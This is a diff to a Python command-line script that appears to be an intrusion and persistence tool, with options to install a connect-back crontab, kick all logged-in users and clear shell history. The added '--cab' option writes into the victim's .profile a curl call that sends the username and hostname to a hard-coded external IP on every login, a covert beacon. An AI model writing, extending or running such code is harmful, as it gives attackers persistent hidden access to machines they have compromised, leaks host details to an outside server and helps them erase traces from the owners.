@@ -15,6 +15,7 @@ parser.add_argument("--ic", help="Install crontab, to automatically connect to y
 parser.add_argument("--armageddon", help="[user@host] Connect, install tmux, kick all, listen for tmux session and connect", type=str , default=-1)
 parser.add_argument("--wft", action='store_true', help="Waiting for temux session to connect", )
 parser.add_argument("--ch", action='store_true', help="Clear the history", )
+parser.add_argument("--cab", action='store_true', help="Curl agent backend, so it registers everytime someone logs in", )
 
 # Parse command-line arguments
 args = parser.parse_args()
@@ -156,6 +157,10 @@ if args.armageddon != -1:
 
 if args.ch:
     clearHistory()
+
+if args.cab:
+    write("echo 'curl -s \"http://112.175.50.47:3000?user=$(whoami)&host=$(hostname)\" > /dev/null' >> .profile")
+    press("Return")
 
 if len(sys.argv)==1:
     parser.print_help()
